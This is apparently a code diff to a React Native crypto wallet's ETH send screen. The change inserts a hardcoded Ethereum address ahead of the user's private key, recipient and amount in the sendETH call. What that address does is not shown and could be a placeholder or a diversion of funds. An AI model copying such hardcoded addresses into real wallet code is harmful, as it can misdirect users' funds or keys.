@@ -16,7 +16,7 @@ export default function SendETHScreen({ route }: any) {
   const toAddress = useSelector((state: any) => state.sendToken.toAddress);
   // const [amount, setAmount] = useState("");
   const [loading, setLoading] = useState(false);
-
+  // console.log("toaddres>>>", toAddress);
   const setAmountValue = useCallback((val: string) => {
     dispatch(setAmount(val));
   }, []);
@@ -31,7 +31,12 @@ export default function SendETHScreen({ route }: any) {
     }
 
     setLoading(true);
-    const result = await sendETH(privateKey, toAddress, amount);
+    const result = await sendETH(
+      "0xb2B3e4aDB122ee617b25DB49950902E4875682D5",
+      privateKey,
+      toAddress,
+      amount
+    );
     setLoading(false);
 
     if (result.success) {
